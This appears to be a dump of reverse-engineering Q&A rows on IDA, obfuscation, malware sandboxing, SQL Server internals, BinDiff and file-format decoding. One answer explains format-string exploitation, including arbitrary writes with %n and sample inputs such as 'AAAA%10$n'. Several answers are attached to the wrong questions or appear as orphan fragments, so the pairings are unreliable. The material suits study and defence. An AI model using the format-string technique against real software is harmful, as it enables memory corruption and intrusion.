"How can I change the Read/Write/Execute flags on a segment in IDA?","3741","","<p>Sometimes when you load a binary manually in IDA you wind up with segments that have unknown read write and execute flags. You can see them under the Segments subview (<kbd>Shift</kbd> + <kbd>F7</kbd>). Is there a way to change these flags from within the GUI of IDA without running a script and modifying them? </p>

<p>It seems like such a basic piece of functionality which is very important for the proper operation of the Hex Rays decompiler. I've been using the class to express segment rights which just seems wrong considering these flags exist.</p>

<p>Although I would appreciate the question being answered in the general case, in this particular case I'm dealing with flat binary ARM files with code and data intermixed. All page level permissions are set up by the software when it loads by directly mapping them via the MMU.</p>
","<p>I don't know of anything natively built into the GUI that allows you to change the segment permissions, but you can easily change the segment permissions with IDC.</p>

<p>As such, if you wanted to set the permissions of a segment that begins at VA 0x00400000 to both Read and Execute, you could just run the following IDC command:</p>

<p><code>SetSegmentAttr(0x00400000, SEGATTR_PERM, 4 | 1);</code></p>

"What is ""overlapping instructions"" obfuscation?","3707","","<p>I analyzed some binaries in x86/x86-64 using some obfuscation tricks. One was called <em>overlapping instructions</em>. Can someone explain how does this obfuscation work and how to work around?</p>
","<p>The paper <a href=""http://infoscience.epfl.ch/record/167546/files/thesis.pdf"">Static Analysis of x86 Executables</a> explains overlapping instructions quite well. The following example is taken from it (page 28):</p>

<pre><code>0000: B8 00 03 C1 BB  mov eax, 0xBBC10300
0005: B9 00 00 00 05  mov ecx, 0x05000000
000A: 03 C1           add eax, ecx
000C: EB F4           jmp $-10
000E: 03 C3           add eax, ebx
0010: C3              ret
</code></pre>

<p>By looking at the code, it is not apparent what the value of eax will be at the return instruction (or that the return instruction is ever reached, for that matter). This is due to the jump from 000C to 0002, an address which is not explicitly present in the listing (jmp $-10 denotes a relative jump from the current program counter value, which is 0xC, and 0xC10 = 2). This jump transfers control to the third byte of the five byte long move instruction at address 0000. Executing the byte sequence starting at address 0002 unfolds a completely new instruction stream:</p>

<pre><code>0000: B8 00 03 C1 BB  mov eax, 0xBBC10300
0005: B9 00 00 00 05  mov ecx, 0x05000000
000A: 03 C1           add eax, ecx
000C: EB F4           jmp $-10
0002: 03 C1           add eax, ecx
0004: BB B9 00 00 00  mov ebx, 0xB9
0009: 05 03 C1 EB F4  add eax, 0xF4EBC103
000E: 03 C3           add eax, ebx
0010: C3              ret
</code></pre>

<p>It would be interesting to know if/how Ida Pro and especially the Hex Rays plugin handle this. Perhaps @IgorSkochinsky can comment on this...</p>

"Mixed 16/32-bit code reversing using IDA","3638","","<p>I am trying to reverse engineer a binary blob I expect to transition from 16-bit real mode into 32-bit protected mode (it is boot time code), so I expect the code to contain code of both sorts.</p>

<p>How do I instruct IDA to attempt to disassemble data at a given address as 32-bit mode?</p>

<p>I can using the 16-bit analyzer deduce the initial jump (unoriginally) and IDA happily analyses the code from there. I can see where the 32-bit code jumps to (far jump, so IDA doesn't try to analyze it), but IDA treats this as 16-bit when I hit <kbd>C</kbd>.</p>

"Where could one find a collection of mid-file binary signatures?","3569","","<p>While reading <a href=""https://reverseengineering.stackexchange.com/a/2996/115"">an answer to another question</a>, it was mentioned that ""<code>78 9C</code>"" was a well-known pattern for Zlib compressed data. Intrigued, I decided to search up the signature on <a href=""http://www.filesignatures.net/index.php?search=789c&amp;mode=SIG"" rel=""nofollow noreferrer"">the file signature database</a> to see if there were any related numbers. It wasn't on there.

"How is a structure located within a disassembled program?","3541","","<p>I took a basic 40-hr Reverse Engineering course a few summers ago. While teaching us to use IDAPro, the instructor demonstrated, rather quickly and without explaining much, how to label certain variables in the ASM as members of a structure, basically equivalent to a good old fashioned <code>struct</code> in C/C++, and treat them as such wherever they are seen in the rest of the code. This seems rather useful to me.</p>

<p>What he did not cover, however, was how to identify a structure. How do you know when a group of variables does in fact constitute a structure and not just a set of related variables? How can you be sure that the author used a <code>struct</code> (or something similar) there?</p>
","<p>There are very common patterns that you will find in code that denote structure usage.</p>

<h2>Dereferencing offsets:</h2>

<p>If you have a pointer which is dereferenced at some non-zero offset, you are probably dealing with a structure. Look for patterns like:</p>

<pre><code>mov eax, [ebp-8]  ; Load a local variable into eax
mov ecx, [eax+8]  ; **Dereference a dword at eax+8**
</code></pre>

<p>In this example, we have a variable that contains a pointer, but we care about the contents of memory at some specific offset <em>ahead</em> of the pointer.  This is exactly how structures are used:  We get a pointer to the structure, and then dereference the pointer plus some offset to access a specific member. In C, the syntax for this is: <code>pMyStruct-&gt;member_at_offset_8</code>.</p>

<p><strong>Side note</strong>:  Do not confuse dereferencing at the offset of some variable with dereferencing at offsets of the stack pointer or the frame pointer (<code>esp</code> or <code>ebp</code>).  Of course, you could think of the local variables and function arguments as being one large structure, but in C, they are not explicitly defined as such.</p>

<h2>More subtle pointer offsets:</h2>

<p>You don't actually need to <em>dereference</em> anything to detect a structure member.  For example:</p>

<pre><code>mov eax, [ebp-8]     ; Load a local variable into eax
push 30h             ; num = 30h
push aSampleString   ; src = ""Sample String""
add eax, 0Ch
push eax             ; dst = eax + 0xC
call strncpy
</code></pre>

<p>In this example, we are copying up to 0x30 characters from some source string to <code>eax + 0xC</code> (see <a href=""http://www.cplusplus.com/reference/cstring/strncpy/"" rel=""nofollow"">strncpy</a>).  This tells us that <code>eax</code> <em>probably</em> points to a structure with a string buffer (of at least 0x30 bytes) at offset 0xC.  For example, the structure may look something like:</p>

<pre><code>struct _MYSTRUCT
{
    DWORD a;      // +0x0
    DWORD b;      // +0x4
    DWORD c;      // +0x8
    CHAR d[0x30]; // +0xC
    ...
}
</code></pre>

<p>In which case, the sample code would look like:</p>

<pre><code>strncpy(&amp;pMyStruct-&gt;d, ""Sample String"", sizeof(pMyStruct-&gt;d));
</code></pre>

<p><strong>Side note:</strong> It is possible (though unlikely) that we could be copying to a large string buffer at offset +0xC, but you would be able to determine this through context.  If, say, offset +0x8 were an integer, for example, then it's definitely a struct.  But if we copied a string of fixed length 0xC to address <code>eax</code> then copied another string to address <code>eax+0xC</code>, it's probably one giant string.</p>

<h2>All reads / all writes:</h2>

<p>Let's say you have a struct (<em>not</em> a pointer to a struct) as a local variable your stack.  Most of the time, IDA doesn't know the difference between a struct on the stack or a bunch of individual local variables.  But a huge tip-off that you're dealing with a structure is if you only ever read from a variable without writing to it, or (less so) if you only write to a variable without reading from it.  Here's an example of each:</p>

<pre><code>lea eax, [ebp+var_58]  ; Load THE ADDRESS of a local variable into eax
push eax
call some_function
mov eax, [ebp+var_54]  ; Let's say we've never touched var_54 before...
test eax, eax          ; ...But we're checking its value!
jz somewhere
...
</code></pre>

<p>In this example, we're reading from <code>var_54</code> without ever writing anything to it (within this function).  This <em>probably</em> means that it is a member of a structure which was accessed from some other function call.  In this example, it's implied that <code>var_58</code> might be the start of that structure, since its address is pushed as the argument to <code>some_function</code>.  You can verify this by following the logic of <code>some_function</code> and checking if its argument is ever dereferenced (and modified) at offset +0x4.  Of course, this doesn't necessarily have to happen in <code>some_function</code> -- it could happen in one of its child functions, or one of <em>its</em> child functions, etc.</p>

<p>A similar example exists for writing:</p>

<pre><code>xor eax, eax
mov [ebp+var_28], eax  ; Let's say this is the *only* time var_28 is touched
lea eax, [ebp+var_30]
push eax
call some_other_function
...
</code></pre>

<p>When you see local variables being set and then never referenced again, you can't just forget about them, because they could very likely be members of a structure which is passed on to another function.  This example implies that a structure (which starts at <code>var_30</code>) is written to at offset +0x8 before the address of that structure is passed to <code>some_other_function</code>.</p>

<p>Both of these examples in C might look like:</p>

<pre><code>some_function(&amp;myStruct);
if (myStruct.member_at_offset_4) ...
</code></pre>

<p>and</p>

<pre><code>myStruct.member_at_offset_8 = 0;
some_other_function(&amp;myStruct);
</code></pre>

<p><strong>Side note:</strong> Although each of these examples used local variables, the same logic applies to globals.</p>

<h2>Documented functions that expect structures:</h2>

<p>This one's probably obvious, and IDA will handle this for you almost all of the time, but an easy way to know when you have a structure in your code is if you call a documented function that expects a certain structure.  For example, <code>CreateProcessW</code> expects a pointer to a <code>STARTUPINFOW</code> structure.  This one shouldn't require an example.</p>

<h2>How do I know if these patterns <em>actually</em> indicate structure usage?</h2>

<p>One final point I want to make is that in all of these cases, yes, technically, the author of the program <em>could</em> written their code without the use of structures.  They also could have written their code by defining every function as <code>__declspec(naked)</code> with a large <code>__asm</code> inline.  You'd never be able to tell.  But arguably, it doesn't matter.  If there are logical groups of values that are stored contiguously in memory and passed from function to function, it is still meaningful to annotate them as structures.  Almost all of the time, this is how the author wrote their code anyway.</p>

<p>If you need me to elaborate on anything, let me know.</p>

","<p><em>When you have a hammer, all the problems look like nails...</em></p>

<p>I´ve studied something called Normalized Compression Distance - <a href=""http://en.wikipedia.org/wiki/Normalized_Compression_Distance#Normalized_compression_distance"">NCD</a>  - some time ago, and I'd give it a try if I had a problem similar to yours.</p>

<ol>
<li><p>I´d make a database of examples. Would take 20 programs for each architecture you want to know, with variable sizes, and save them.</p></li>
<li><p>When confronted with a program that I wanted to know which architecture it is, I´d compute it´s NCD against all my examples.</p></li>
<li><p>I´d pick the best (smaller) NCD and would then verify it if is was a real match (let´s say, trying to run it on the discovered architecture).</p></li>
</ol>

<p><em>Update</em></p>

<p>I´ve always done in <em>by hand</em>, when it comes to NCD. How I did it:</p>

<ul>
<li><p>you have 20 files for SPARC and you call them A01, A02, A03, and so on. Your x86 files: B01, B02, etc.</p></li>
<li><p>You get the unknown file and call it XX.</p></li>
<li><p>Choose your preferred compression tool (I used Gzip, but see remarks at the end of this answer).</p></li>
<li><p>Calculate NCD for the first pair:</p></li>
</ul>

<p>NCD(XX,A01) = ( Z(XX+A01) - min(Z(XX), Z(A01) ) / max(Z(XX), Z(A01))</p>

<p>Z( something ) -> means that you compress the <em>something</em> with Gzip and get the file size after compression. For example, 8763 bytes, so Z(something) = 8763.</p>

<p>XX + A01 -> means that you concatenate things. You append the A01 file to the end of the XX file. In linux, you could do a ´cat XX A01 > XXA01´.</p>

<p>min() and max() -> you calculate the compressed size of XX and A01, and use the minimum and maximum that you get.</p>

<p>So you´ll have a NCD value: it´ll lie between 0 and 1, and use as many decimals places as you can, because sometimes the difference is in the 7th or 8th digit. It´ll be like comparing 0.999999887 to 0.999999524.</p>

<p>You´ll do that for every file, so you´ll have 20 NCD results for SPARC, 20 for x86...</p>

<p>Get the smaller NCD of all. Let´s say that the B07 file gave you the smaller NCD. So, probably, the unknow file is a x86.</p>

<p>Tips:</p>

<ul>
<li><p>your unknow and your test files must have a similar size. When you compare a file with bigger or smaller ones, NCD won´t do it´s magic. So, if you´ll be testing files of 5 to 10k, I´d get test files of 2.5k, 5k, 7.5k, 10k, 12.5k ...</p></li>
<li><p>In my Master degree I got better results always using the smaller NCD value. The second best method was to do some voting: get the 5 smaller NCD results, and see which architecture got more votes. Ex.: smaller NCD were A03, A05, B02, B06, B07 -> B go 3 votes, so I´d say it´s a x86...</p></li>
<li><p>compressors based on the Zip construction have a limitation of 32kB: the way they compress things, they just consider 32kB at time. If your XX + A01 is bigger than this, Gzip, Zip, etc., won´t give you good results. So, for files that are bigger than 15 or 16kB, I´d choose another compressor: PPMD, Bzip...</p></li>
</ul>

<p>It seems to be possible to this by using the binary search, but this requires converting the assembly to the corresponding binary opcodes. </p>

<p>Assuming you already have one location found, you can look in the binary hex view, and find the byte pattern you want and use that in a binary search, just make sure you write each byte with a space between them like <code>01 02 03 04</code> so IDA treats them as a sequence of bytes, not as a word/int type search.</p>

<p>If you have a regex like soft match like</p>

add r4,r4,r0

<p>but you don't know <code>r4</code> will be the register used, but know it will be this pattern of <code>slwi</code> and <code>add</code> then I'd write a script (IDC or python) that searches using a text search for outer clause, and then checks for the next instruction to match the expected test, or move to next outer clause.</p>

"How can I analyze a potentially harmful binary safely?","3449","","<p>I've recently managed to isolate and archive a few files that managed to wreak havoc on one of my client's systems. So I was wondering what software and techniques make the best sandbox for isolating the code and digging into it to find out how it works.</p>

<p>Usually, up to this point in time I would just fire up a new VMWare or QEMU instance and dig away, but I am well aware that some well-written malware can break out of a VM relatively easily. So I am looking for techniques (Like using a VM with a different emulated CPU architecture for example.) and software (Maybe a sandbox suite of the sorts?) to mitigate the possibility of the code I am working on ""breaking out"".</p>

<p>What techniques do you recommend? What software do you recommend?</p>
","<p>The title mentions ""sandbox"" but VMWare or QEMU is usually not called that, so the question seems to be more about ""how do I analyze it without a danger of infection?""</p>

<p>There are three broad categories of tools and approaches you could take here.</p>

<h1>1. User-mode sandboxes</h1>

<p>A user-mode sandbox basically runs the sample being investigated but intercepts all or at least the most critical APIs that access the host OS, neutralizes them and modifies the results to fool the software into thinking it's running all alone. One of the most popular such tools seems to be <a href=""http://www.sandboxie.com/"">Sandboxie</a>, but there exist others such as <a href=""http://code.google.com/p/pyboxed/"">PyBox</a>. Usually can be detected by the malware pretty easily and there's always a danger that an unemulated API will let the code to run amok.</p>

<h1>2. Virtual machines and emulators</h1>

<p>These go a bit deeper and try to emulate not only APIs but execution of the actual code. As well, usually you need to run a full OS inside the emulator and can't use the host OS as is (could be an advantage or disadvantage depending on your goals). These can be further subdivided in three categories by approach used for emulation:</p>

<h3>a)  virtualization</h3>

<p>These include VMWare, VirtualBox and VirtualPC. They use virtualization features of the recent processors to run most of the code natively and only emulate memory or hardware accesses. This makes them fast but in theory can lead to code escaping the VM in case of implementation bugs.</p>

<h3>b) dynamic translation</h3>

<p>This approach is used by QEMU. It translates each basic block into a sequence of native CPU's instructions and executes that. This approach allows it to reasonably fast emulate many different architectures, however the timing may differ quite a lot from the original. I don't think I've heard of any VM escaping bugs but it's possible to detect it.</p>

<h3>c) full emulation</h3>

<p>This is used by Bochs. It fully emulates each separate instruction one by one, as they're being executed. This makes it somewhat slower than other solutions but allows it to achieve almost perfect emulation of even the most low-level details. It's also probably the safest regarding to VM escaping bugs. There were some implementation bugs that could be used to detect it but I think most of them have been fixed.</p>

<h1>3. Static analysis</h1>

<p>The best way to avoid the break out is to not run the code at all! Also, static analysis allows you to look at the complete code of the binary and see all of it, even the code paths which are not taken by running it and you sidestep all runtime checks and detections.</p>

<p>Unfortunately, static analysis can be hampered by packing or obfuscation used in the malware. So it's often necessary to combine several approaches. I'm not a professional analyst, but I do dabble in some malware analysis. My workflow usually goes like this:</p>

<ol>
<li>Open sample in IDA.</li>

"Server-side Query interception with MS SQL Server","3415","","<p>I'm researching into intercepting queries that arrive at the SQL Server 2008 process.</p>

<p>SQLOS architecture is divided in the following system DLLs:</p>

<ul>
<li><strong>sqlmin.dll</strong>: Storage, replication, security features,etc.</li>
<li><strong>sqllang.dll</strong>: TransactSQL query execution engine, expression evaluation, etc.</li>
<li><strong>sqldk.dll</strong>: Task scheduling and dispatch, worked thread creation, message loops, etc.</li>
</ul>

<p><em>SQLSERVR</em> service process instances the SQLOS components through <em>sqlboot.dll</em> and <em>sqldk.dll</em>, and the worker threads receive queries through the selected connection method in the server (TCP/IP, local shared memory or named-pipes).</p>

<p>I've debugged the sqlservr.exe process address space searching for textual queries. It seems that query strings are readable, but I could not find a point where queries can be intercepted while they enter the SQLOS scheduler.</p>

<p>Listening to pipes or TCP/IP is not an option at this moment; I would like to inject at a higher level, preferably at SQLOS-component level.</p>

<p>Any idea on where to start looking into? </p>
","<p>This seemed like a fun project for a Sunday afternoon, so I had a go at it. To get straight to the point, here's the call stack for a function in SQL server that parses and then executes the query (addresses and offsets taken from SQL Server 2008 R2 running on Windows 7 SP1 32-bit):</p>

<p>Based on this, you probably want to take a close look at the <code>CSQLSource</code> class, and particularly its <code>Execute</code> method.</p>

<p>Armed with this information, I was also able to dig up a couple <a href=""http://blogs.msdn.com/b/askjay/archive/2010/10/03/how-do-i-find-what-queries-were-executing-in-a-sql-memory-dump.aspx"">blog posts</a> by someone at Microsoft on how to extract the query string from a memory dump of SQL Server. That post seems to confirm that we're on the right track, and gives you a place to interpose and a way to extract the query string.</p>

<h1>Methodology</h1>

<p>I felt like this would be most easily tackled using some form of Dynamic Binary Instrumentation (DBI); since we suspect the query string will be processed somewhere in the SQL Server process, we can look at memory reads and writes made by the process, searching for a point that reads or writes the query string. We can then dump the callstack at that point and see what interesting addresses show up, and map them back to symbols (since, as Rolf points out, SQL Server has debug symbols available). It really was basically as simple as that!</p>

<p>Of course, the trick is having something around that lets you easily instrument a process. I solved this using a (hopefully soon-to-be-released) whole-system dynamic analysis framework based on <a href=""http://wiki.qemu.org/Main_Page"">QEMU</a>; this let me avoid any unpleasantness involved in getting SQL Server to run under, e.g., <a href=""http://software.intel.com/en-us/articles/pin-a-dynamic-binary-instrumentation-tool"">PIN</a>. Because the framework includes record and replay support, I also didn't have to worry about slowing down the server process with my instrumentation. Once I had the callstack, I used <a href=""https://code.google.com/p/pdbparse/"">PDBParse</a> to get the function names.</p>

"How does BinDiff work?","3332","","<p>I would like to know what are the basic principles (and maybe a few things about the optimizations and heuristics) of the <a href=""http://www.zynamics.com/bindiff.html"">BinDiff software</a>. Does anyone have a nice and pedagogic explanation of it?</p>
","<p>In general, BinDiff in its current version as of this writing (4.x) works by matching attributes on the function level. 
Basically, matching is divided into two phases: first initial matches are generated which are then refined in the drill down phase.</p>

<h2>Initial Matches</h2>

<p>First of all BinDiff associates a signature based on the following attributes to each function:</p>

<ul>
<li>the number of basic blocks</li>
<li>the number of edges between those blocks</li>
<li>the number of calls to subfunctions</li>
</ul>

<p>This step gives us a set of signatures for each binary which in turn are used to generate the set of initial matches. Following a one-to-one relation, BinDiff selects these initial matches based on the above characteristics.</p>

<p>The next step tries to find matchings on the call graph of each binary: for a verified match, the set of called functions from the matched function is examined in order to find event more matches. This process is repeated as long as new matches are found.</p>

<h2>Drill Down</h2>

<p>In practice, not all functions will be matched by the one-to-one relation induced by the initial matching strategy, so after the initial matchings have been determined we still have a list of unmatched functions.
The idea of the drill down phase is to have multiple different function matchings strategies which are applied until a match is found. The order of applying these strategies is important: BinDiff tries those strategies for which it assumes the highest confidence, first. Only if no match could be found, it goes on with the next strategy. This is repeated until BinDiff runs out of strategies, or until all functions are matched. Examples include MD index, match based on function names (i.e. imports), callgraph edges MD index, etc.</p>

This happens for both <code>-m32</code> and <code>-m64</code> switch, even though I am on a 64-bit machine, and there indeed seem to be a dedicated instruction set for 64-bit integers, including operations such as <code>movq</code> and <code>addq</code>.</p>

<li><p>If I put <code>movq</code> in a program designed for a 32-bit machine, will the desired behavior be emulated, or will the instruction be misunderstood?</p></li>

","<h2><strong>1:</strong></h2>

<p>See the <strong>Immediates</strong> section on <a href=""http://www.x86-64.org/documentation/assembly.html"" rel=""nofollow"">this 64 bit assembly reference</a>.</p>

<blockquote>
  <p>Immediate values inside instructions remain 32 bits and their value is sign extended to 64 bits</p>
</blockquote>

<p>There just isn't an instruction to move a 64 bit immediate value to <em>memory</em> (*). And because it can be emulated nicely by moving two chunks of 32 bit, there was no reason to introduce new 64 bit instructions. (They could have changed the immediate <code>mov</code>s to always use 64 bits. But considering that most constants you'll ever use are &lt;= 2^31, using 32 bit only saves a lot of space for the upper zero bytes, and costs a bit when you actually use larger constants, so this saves memory).</p>

<p>(*) However, there are instructions to move a 64 bit immediate value to the 64 bit registers, because you can't access the high 32 bit in registers, opposed to memory.</p>

<p>I don't know why your program produced separate addl/adcl instructions; this is what i got from your program:</p>

<pre><code>    pushq   %rbp
    movq    %rsp, %rbp
    movl    $2041302511, -24(%rbp)
    movl    $1193046, -20(%rbp)
    movl    $-2023406815, -16(%rbp)
    movl    $16632745, -12(%rbp)
    movq    -16(%rbp), %rax
    movq    -24(%rbp), %rdx
    leaq    (%rdx,%rax), %rax
    movq    %rax, -8(%rbp)
    movl    $0, %eax
    leave
    ret
</code></pre>

<p>As you can see, the <code>leaq    (%rdx,%rax), %rax</code> adds 64 bit numbers all right. This was a gcc 4.4.7 on a RHEL 6.6 64 bit system. Please, always state your compiler and OS version, as the output may be quite dependent on those.</p>

<h2><strong>2:</strong></h2>

<p>As long as you're dealing with an x86/amd64 architecture, you can probably rely on local variables being put on the stack, and global variables not on the stack. But please note the concept of 'stack' and 'heap' aren't as clearly defined as it would seem. The <code>brk/sbrk</code> mechanism of allocating memory is deprecated; modern implementations use <code>mmap</code>. This might mean you have several small heaps in different sections of your address space. On ARM and MIPS, there's no stack pointer at all - there's just a convention that one specific register serves as the stack pointer, but the instructions to push/pop would work with other registers as well(*). In theory, the compiler is free to do a <code>mmap()</code> at the start of each function to allocate local memory, and <code>munmap()</code> it at the end of the function. The only thing the compiler <em>must</em> do is not keep the memory allocated (for reasonable definitions of allocated) after the function exits.</p>

<p>(*) This is a bit of an oversimplification but demonstrates the concept.</p>

<p>Of course, the idea of using <code>mmap()</code> to make space for local variables is an extreme example, that <em>probably</em> noone uses. But lots of compilers put local variables into processor registers and never reserve space on the stack for them (if you never use a pointer to them, and on architectures that aren't as register-starved as x86). Many architectures use processor registers for function arguments as well. And i've seen microcontroller C compilers that allow you to put all variables local to a function into a static area, if you use a certain keyword so the compiler knows the function isn't called recursively. So, while most of the time, local variables will be placed on the stack, you shouldn't assume this is carved in stone.</p>

<h2><strong>3.</strong></h2>

<p>The instruction will be misunderstood. The processor can be in 32 bit or 64 bit mode, and the same instructions (in the meaning of: the same sequence of instruction bytes) have different meanings in each of them. For example, <code>48 89 43 ec</code> is <code>mov [rbx-20],rax</code> in 64 bit mode, but <code>dec eax; mov DWORD PTR [ebx-0x14],eax</code> in 32 bit mode.</p>

"How can a format string vulnerability be used to write a specific string into memory?","3270","","<p>I think I understand how a format string vulnerability works, but what I have seen so far it can only be used to increase the value of an integer.</p>

<p>Can format string vulnerability also be used to write anything else?</p>

<p>And, by the way, are there languages, other then C and C++, that are at risk of creating such a vulnerability? How can I spot a format string vulnerability if I only have a binary?</p>
","<p>It's a lot of questions, here are a few answers:</p>

<h2>How can we write something in memory with a format string vulnerability ?</h2>

<p>For this, you need to know two specific features used in the <code>printf</code> format string specifications. First, <code>%n</code> is a format specifier that has the following effect (according to the manual page):</p>

<blockquote>
  <p><code>%n</code> The number of characters written so far is stored into the integer indicated by the <code>int *</code> (or variant) pointer argument. No argument is converted.</p>
</blockquote>

<p>Now, the second format string feature will allow us to select a specific argument from the format string. The main selection operator is <code>$</code>, and the following code means that we select the second argument (here the outcome will be to display <code>2</code>):</p>

<pre><code>printf(""%2$x"", 1, 2, 3)
</code></pre>

<p>But, in the general case, we can do <code>printf(""%&lt;some number&gt;$x"")</code> to select an arbitrary argument of the current <code>printf</code> function (format string argument does not count).</p>

<p>If we could pass the string <code>AAAA%10$n</code> to the program and make it appear as a format string, then we could write the value <code>4</code> to the address <code>0x41414141</code>.</p>

<p>So, format string bugs may offer a full access to the memory and you can decide what to write and where in the memory.</p>

<p>I really advise you to read ""<a href=""http://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf"">Exploiting Format String Vulnerabilities</a>"" from Scut (2001) to get a whole grasp on these kind of manipulations.</p>

<h2>Are they other languages than C/C++ that are vulnerable to these bugs ?</h2>

<p>Well, format string bugs are tied up to the <code>printf</code> function family and the way format strings may be passed to the function. It's a whole class of security issue itself. So, you might find ways to exploit similar problems in some other languages. Though, you may not find the exact same features as the format string capabilities in other languages may differ a lot.</p>

<p>I do think about languages such as Perl, Python, and so on, that all offer similar access to format string features.</p>

<h2>How can I spot format string vulnerabilities if I have only the binary ?</h2>

<p>First, you have to locate the calls to procedure of the <code>printf</code> family. Then, I would say that fuzz-testing (fuzzing) should be a good way to find the vulnerabilities. Especially if you can forge a few entries with seeds such as <code>AAAA%10$n</code>.</p>

<p>If you want a more accurate and exhaustive way to find it, you will probably need to do some binary analysis and taint analysis on every call to a procedure of the <code>printf</code> family.</p>

<p>So I searched router firmware for srings of text like above and found this line</p>

<blockquote>
  <p>deflate 1.1.4 jean loup gailly</p>
</blockquote>

<p>nearby some of strings, after quick google it seams that this is zlib and its used for compression of ""something"", after that with my little knowlage I tried to decompress it with comands like this </p>

<blockquote>
  <p>printf ""\x1f\x8b\x08\x00\x00\x00\x00\x00"" |cat - zlib.raw |gzip -dc</p>
  
  <p>cat /tmp/data | openssl zlib -d</p>
</blockquote>

<p>but with no luck, later on I found similar file on web with no compression on it, so I take a look and it seams that header of file and couple more ""byts"" are the same as my compressed file and Im not sure how I can skip these first ""byts"" and try to decompress rest of ""data"", also from log u can see some type of ""Sign"" which are also need to be skiped, here is how similar file which is not compressed look like</p>

"Where to find information about a file format?","3259","","<p>Let's say I found 'some' file (might be an executable, might be data, or something else) and want to run or read it. I open this file in a text editor, but the format isn't readable. Examples include: Java class, Windows executable, SQLite database, DLL, ...</p>

<p><em>I do know the file format, if we can trust the extension.</em></p>

<p>Is there somewhere a site or database with a lot of information about a lot encrypted or binary file formats? Information should include:</p>

<ul>
<li>File use</li>
<li>File layout and structure</li>
<li>Eventually programs that can read or execute the file</li>
</ul>

<p>So I'm not looking for a way to identify the format of the file. I already know the file format, but need to have information about that format. When is the format used (in what applications), what's the format's structure?</p>
","<p>I am a developer for the <a href=""https://bitbucket.org/haypo/hachoir/wiki/Home"">Hachoir project</a>, which aims to describe the format of any file down to the bit-level. Currently it has parsers for a number of well-known formats, including Java classes, Windows executables, MP3 files, etc. The full list of parsers can be found in the subdirectories <a href=""https://bitbucket.org/haypo/hachoir/src/9bae02ddf53ea7284f7a431654849ad5e553c429/hachoir-parser/hachoir_parser?at=default"">here</a>.</p>

<p>When working on a new parser for <code>hachoir_parser</code>, it is often necessary to find information about a file format. There's no single source describing every format (even as Hachoir aspires to be this source, it is not nearly comprehensive enough). Generally, the first step is just to search for <code>&lt;file format name&gt; file format</code>, e.g. <code>java class file format</code>, and look for documentation on official sites (for java classes, this turns up Oracle's documentation, which should be all you need). If there are no official sites, you may still turn up some documentation from someone who has worked on the format in the past.</p>

<p>For common file formats, this turns up the format specification you want about 90-95% of the time. Larger software companies, like Oracle and Microsoft, post their file format specifications online for interoperability purposes. For example, you can find documentation for PE (Windows EXE/DLL), MS Office formats (XLS, PPT, DOC), and other Microsoft formats by browsing or searching MSDN.</p>

<p>For multimedia formats, the <a href=""http://wiki.multimedia.cx/index.php?title=Main_Page"">Multimedia Wiki</a> is a great resource. They also cover some game file formats  as well.</p>

<p>For a less common file format, for which I do not find a specification (or suitable description) from Googling, my approach is usually to find an open-source program that does understand the file, and either locate their format specification source (if described in a commit or README), or read their source code directly to understand the file format.</p>

<p>If there are no open-source programs for the file, and no openly available descriptions of the file format online, the file format is probably quite obscure. For game files (in which many developers insist on using their own proprietary formats), I've found <a href=""http://forum.xentax.com/"">XeNTaX</a> to offer some good pointers and a good community to help figure out the formats. With other kinds of formats, you may have to start examining the samples you have to compare the byte fields and elucidate their function. If you have a program that accepts these files, you can try changing the fields methodically to determine what effects they have on the program's output. This is ultimately the ""real"" reverse-engineering work, and I think it is not within the scope of this answer. </p>

"Reverse engineering compressed file, where to start?","3210","","<p>I want to open finnish sports league ""data file"" used for bookkeeping. It includes all statistics for few decade, so it's interesting data file.</p>

<p>The file is here: <a href=""http://www.bittilahde.fi/Tietokanta.dat"" rel=""nofollow noreferrer"">http://www.bittilahde.fi/Tietokanta.dat</a> (Database.dat in english)</p>

<p>The book keeping program is here: <a href=""http://www.pesistulokset.fi/Kirjaus504.exe"" rel=""nofollow noreferrer"">http://www.pesistulokset.fi/Kirjaus504.exe</a></p>

<p>What I've found out:</p>

<ul>
<li>The histogram of database file is completely flat</li>
<li>There's no header I could recognize in database file</li>
<li>The .exe is compiled with Delphi 4</li>
<li>I can find some data structures with <a href=""http://kpnc.org/idr32/en/index.htm"" rel=""nofollow noreferrer"">IDR</a>, but cannot figure out how uncompress the file.</li>
</ul>

<p>What could be the next step? </p>
","<p>Looking at it in <a href=""http://www.ollydbg.de/"" rel=""nofollow noreferrer"">OllyDbg</a> it looks like a heavy task. Looks like a custom database with encrypted and (custom?) compressed data. This or the like would usually be the case in such applications. A flat file with structured data is not part of this one.</p>

<p>Anyhow. As a starter:</p>

<p>A quick check after trying out some general compression tools like 7z or binwalk, (have not tested it), can be to use <a href=""http://technet.microsoft.com/en-us/sysinternals/bb896645.aspx"" rel=""nofollow noreferrer"">ProcMon</a> from Sysinternals. Start ProcMon, then your application and set filter on the application in ProcMon. You quickly find that:</p>

<p>In short it reads in chunks of varying size, but for main data processing it reads chunks of 16384 bytes. The process in steps:</p>

<ol>
<li>Generate seed map of 256 integers. (Done once at application start.)</li>
<li>Loop:<br />
2.1 Read 16384 bytes into buffer from .dat file.<br />
2.2 XOR routine on buffer using offset and last four bytes of buffer as base.<br />
2.3 Checksum on XOR'ed buffer using seed map from step 1.<br />
2.4 Parse buffer and read out data.</li>
</ol>

<p>The application also reads same chunks multiple times.</p>

<h1>2.1:</h1>

<p><em>Steps and details in order of discovery:</em></p>

<p>Split the .dat file in chunks of 16384 bytes and also generate a hex-dump of each file for easy search and comparison. To be honest I use Linux for this part with <code>dd</code>, <code>xxd -ps</code>, <code>grep</code>, <code>diff</code> etc.</p>

<p>Start OllyDbg, open the application, locate <code>CreateFile</code> and set breakpoint:</p>

<pre><code>00401220   $-FF25 18825000  JMP DWORD PTR DS:[&lt;&amp;kernel32.CreateFileA&gt;;  kernel32.CreateFileA
</code></pre>

<p>Press <code>F9</code> until filename (in <code>EAX</code>) is .dat file. Set/enable breakpoint on <code>ReadFile</code>. <code>F9</code> and when read is done start stepping and looking at what is done.</p>

<hr>

<p>Looking at it:</p>

<h1>2.2:</h1>

<p>After read it first modify the buffer by using offset as ""magic"" starting at:</p>

<pre><code>0045F5EC  /$ 53   PUSH EBX     ;  ALGO 2: XOR algorithm - post file read.
...
0045F6B6  \. C3   RETN         ;  ALGO 2: RETN
</code></pre>

